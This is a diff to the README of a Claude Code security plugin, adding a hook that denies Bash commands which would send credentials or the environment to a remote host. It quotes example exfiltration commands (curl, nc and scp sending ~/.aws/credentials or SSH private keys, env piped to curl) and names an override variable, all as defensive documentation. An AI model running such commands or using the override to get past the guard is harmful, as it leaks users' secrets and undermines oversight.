@@ -1,7 +1,7 @@
 # gramatr-guards — Claude Code plugin
 
 Secret, PII and prompt-injection guards for Claude Code. The plugin wires
-seven hooks and one MCP server into a session. They catch credentials in
+eight hooks and one MCP server into a session. They catch credentials in
 tool output, agent-to-agent messages, MCP results, credential files and
 outbound publishes (issues, PRs, commits).
 
@@ -34,7 +34,7 @@ the text. Read [`docs/LIMITS.md`](../docs/LIMITS.md) before relying on this.
 | [Threat model](https://github.com/gramatr/guards-unified/blob/main/docs/THREAT-MODEL.md) | Assets, actors, trust boundaries, and what is and is not defended (in guards-unified) |
 | [`SECURITY.md`](../SECURITY.md) | How to report a vulnerability privately |
 
-## The seven hooks
+## The eight hooks
 
 | # | Event and matcher | Script | What it does |
 |---|---|---|---|
@@ -44,7 +44,8 @@ the text. Read [`docs/LIMITS.md`](../docs/LIMITS.md) before relying on this.
 | 4 | `PreToolUse` on `SendMessage` | `hooks/sendmessage-guard.sh` | Redacts secrets in outgoing agent-to-agent messages; notes PII |
 | 5 | `PreToolUse` on `Read\|Grep\|Bash` | `hooks/credfile-guard.sh` | Denies (or asks about) reads of credential files before any content exists |
 | 6 | `PreToolUse` on `Bash\|mcp__.*github.*` | `hooks/publish-guard.sh` | Denies (or asks about) publishes that carry credentials |
-| 7 | `UserPromptSubmit` | `hooks/userpromptsubmit-guard.sh` | Adds a note when your own prompt contains a secret. Advisory only |
+| 7 | `PreToolUse` on `Bash` | `hooks/outbound-guard.sh` | Denies (or asks about) a command that would send a credential file, the whole environment or a literal credential to a remote host |
+| 8 | `UserPromptSubmit` | `hooks/userpromptsubmit-guard.sh` | Adds a note when your own prompt contains a secret. Advisory only |
 
 Plus an MCP server (`mcp/server.py`, started with `uv run --script`) that
 exposes one tool, `scan`.
@@ -458,6 +459,31 @@ and similar are skipped.
 Writing about secrets trips the guard too. Pass commit messages and PR bodies
 through files, describe shapes rather than values, and mark deliberately fake
 fixture lines `guards:synthetic`. Tests: `guards/tests/publish-guard.test.sh`.
+
+### Outbound commands (PreToolUse): `outbound-guard.sh`
+
+Stops a Bash command from sending credential material to a remote host. It
+checks commands whose command word is `curl`, `wget`, HTTPie, `nc`, `scp`,
+`rsync`, `sftp` or `ssh`:
+
+- a **credential file** the client would send (`curl -d @~/.aws/credentials`,
+  `nc host 9 < ~/.ssh/id_ed25519`, `scp ~/.ssh/id_ed25519 host:`) or the **whole
+  environment** (`env | curl -d @- ...`) is denied; `.env`, kubeconfig and
+  similar ask a person where one can answer and are denied elsewhere;
+- a **literal credential in the command text** is denied (a vendor-shaped token,
+  a private-key header, a value from the session's environment) or asked about
+  (`-u user:pw`, an `X-Api-Key` value, a password in a URL or a body).
+
+The `@` is not the problem: `curl -H @headers.txt` and `curl -d @payload.json`
+are fine, and so are a config file (`-K`), `--netrc-file` and a body on standard
+input. A deny shows the scanner-redacted line, never the value, and teaches
+those forms. It fails closed for a command that names a client when the check
+cannot finish. Override: `GUARDS_ALLOW_OUTBOUND_SECRETS=1` in the environment
+Claude Code starts from (typed in front of a command it does nothing). Best
+effort, not a sandbox: variables, aliases, scripts and other interpreters are
+not seen. Details: [`docs/HOOKS.md`](../docs/HOOKS.md),
+[`docs/LIMITS.md`](../docs/LIMITS.md#outbound-commands),
+[`docs/OUTBOUND-SAFE-FORMS.md`](../docs/OUTBOUND-SAFE-FORMS.md).
 
 ### The MCP server: `mcp/server.py`
 
